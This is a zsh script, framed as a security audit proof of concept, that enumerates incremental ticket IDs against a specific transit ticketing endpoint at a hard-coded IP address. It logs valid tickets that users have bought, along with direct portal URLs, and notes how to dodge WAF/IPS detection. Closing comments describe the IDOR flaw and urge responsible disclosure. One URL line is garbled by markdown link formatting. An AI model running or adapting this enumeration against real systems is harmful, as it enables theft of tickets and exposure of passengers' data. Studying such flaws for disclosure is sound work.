#!/bin/zsh
################################################################################
# Script Name:       ticket-validator-audit
# Description:       Security research utility used to identify ID enumeration 
#                    vulnerabilities in a digital transit ticketing system. 
#                    Automates the discovery of valid ticket IDs by testing 
#                    incremental identifiers against a verification endpoint.
# Author:            Stefan
# Version:           1.0
# Last Modified:     2026-04-24
# Dependencies:      zsh, ripgrep (rg), custom 'bilet' binary/alias
# Hardware:          Requires network access to the ticketing API
################################################################################

# ==============================================================================
# FUNCTIONALITY OVERVIEW
# ==============================================================================
# 1. Accepts an input file containing a list of potential ticket IDs (based on
#    discovered incremental patterns like 'aaaaaa', 'aaaaab').
# 2. Iteratively invokes a local verification tool ('bilet') for each ID.
# 3. Uses pattern matching (rg) to identify valid tickets by searching for the
#    "Ticket valid till" string in the response.
# 4. For every hit, it generates a direct URL to the ticketing portal and 
#    extracts the expiration metadata.
# 5. Logs successful discoveries to 'lista_bilete.txt' for further analysis of
#    the vulnerability impact (e.g., finding long-term monthly passes).
# ==============================================================================

red='\033[1;31m'
green='\033[1;32m'
yellow='\033[0;33m'
nc='\033[0m'

# Resolve absolute path for the input file containing candidate IDs
codes=$(pwd)/$1

# Basic input validation
if [[ $codes = "" ]];then
    echo "No input"
    exit
fi

# File processing mode
if [ -f $codes ];then
    echo "--------------------------"
    echo "File $codes supplied successfully"
    echo "--------------------------"
    
    while read code; do
        # Execute the 'bilet' tool and check for validity string
        # This confirms if an incremental ID has been purchased by a user
        b=$(echo $(bilet $code) | rg "Ticket valid till")
        
        if [[ $b != "" ]];then
            # Valid ticket found: output to console in green
            echo "${green}$code${nc}"
            echo "${green}$b${nc}"
            # Construct the direct URL to the vulnerable web portal
            echo "${green}[https://89.36.133.118:8451/Tran.aspx?Id=BiletArad_$code$](https://89.36.133.118:8451/Tran.aspx?Id=BiletArad_$code$){nc}"
            
            # Archive the successful find for reporting/audit purposes
            echo "$b" >> lista_bilete.txt
            echo "[https://89.36.133.118:8451/Tran.aspx?Id=BiletArad_$code](https://89.36.133.118:8451/Tran.aspx?Id=BiletArad_$code)" >> lista_bilete.txt
            echo "" >> lista_bilete.txt
        else
            # No valid ticket for this ID: display in yellow
            echo "${yellow}$code${nc}"
        fi
        # Optional: sleep 5 (Rate limiting to avoid triggering WAF/IPS)
    done < $codes
    exit
fi

# Single ID testing mode
echo "$codes"
bilet "$codes"

# ==============================================================================
# SECURITY CONSIDERATIONS (VULNERABILITY REPORTING)
# ==============================================================================
# 1. INSECURE DIRECT OBJECT REFERENCE (IDOR): The system uses predictable, 
#    incremental IDs. An attacker can enumerate all active tickets and 
#    subscriptions by simply guessing the next logical string.
# 2. INFORMATION EXPOSURE: The 'Tran.aspx' endpoint likely leaks PII (Personally 
#    Identifiable Information) or purchase history without authentication.
# 3. RATE LIMITING ABSENCE: The ability to run this script without being 
#    blocked indicates a lack of API rate limiting or IP-based blacklisting.
# 4. LACK OF CRYPTOGRAPHIC ENTROPY: IDs should be UUIDs or cryptographically 
#    secure random strings to prevent brute-forcing and enumeration.
# 5. ETHICAL DISCLOSURE: This script is a Proof of Concept (PoC). Such 
#    vulnerabilities should be reported to the provider via a Responsible 
#    Disclosure program to ensure public infrastructure security.
# ==============================================================================